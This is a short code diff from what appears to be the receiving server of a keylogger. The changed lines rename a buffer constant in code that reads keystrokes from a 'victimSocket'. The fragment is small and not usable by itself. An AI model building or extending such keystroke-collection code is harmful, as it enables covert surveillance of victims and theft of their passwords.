@@ -41,10 +41,10 @@ void main(int argc, char *argv[]) {
 			printf("accept() failed");
 		}
 
-		CHAR keystrokeBuffer[RCVBUFSIZE+1];
+		CHAR keystrokeBuffer[BUFFER_SIZE + 1];
 		INT recvMsgSize; 
 
-		if ((recvMsgSize = recv(victimSocket, keystrokeBuffer, RCVBUFSIZE, 0)) < 0) {
+		if ((recvMsgSize = recv(victimSocket, keystrokeBuffer, BUFFER_SIZE, 0)) < 0) {
 			printf("recv() failed\n");
 		}
 
